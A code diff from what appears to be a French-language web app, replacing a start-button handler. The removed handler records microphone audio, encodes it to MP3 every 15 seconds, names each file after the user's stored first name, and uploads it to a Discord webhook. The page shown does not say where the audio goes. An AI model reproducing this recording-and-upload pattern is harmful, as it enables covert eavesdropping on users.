@@ -458,51 +458,12 @@
 };
 
   
-    startBtn.onclick = async () => {
-      if (isRecording) return;
-      isRecording = true;
-      overlay.style.display = "flex";
-  
-      try {
-        
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        input = audioContext.createMediaStreamSource(stream);
-        processor = audioContext.createScriptProcessor(4096, 1, 1);
-  
-        processor.onaudioprocess = e => {
-          const channelData = e.inputBuffer.getChannelData(0);
-          buffer.push(new Float32Array(channelData));
-        };
-  
-        input.connect(processor);
-        processor.connect(audioContext.destination);
-  
-        setInterval(() => {
-          if (buffer.length === 0) return;
-  
-          const recorded = flattenArray(buffer);
-          const mp3Blob = encodeMp3(recorded, audioContext.sampleRate);
-          buffer = [];
-  
-          const prenom = localStorage.getItem("prenom") || "utilisateur";
-          const timestamp = Date.now();
-          const fileName = `${prenom.toLowerCase()}_vocal_${timestamp}.mp3`;
-  
-          const formData = new FormData();
-          formData.append("file", mp3Blob, fileName);
-  
-          fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            body: formData
-          }).catch(console.error);
-        }, 15000);
-      } catch (err) {
-        alert("Erreur micro : " + err.message);
-        console.error(err);
-        isRecording = false;
-        overlay.style.display = "none";
-      }
-    };
+startBtn.onclick = () => {
+  document.getElementById("welcomeBox").style.display = "none";
+  document.getElementById("mainContent").classList.remove("blur-background");
+  showMicroHelp(); // ⬅️ C’est ici que tu attends le clic utilisateur avant de lancer la demande micro
+};
+
   
     function flattenArray(buffer) {
       const length = buffer.reduce((acc, val) => acc + val.length, 0);
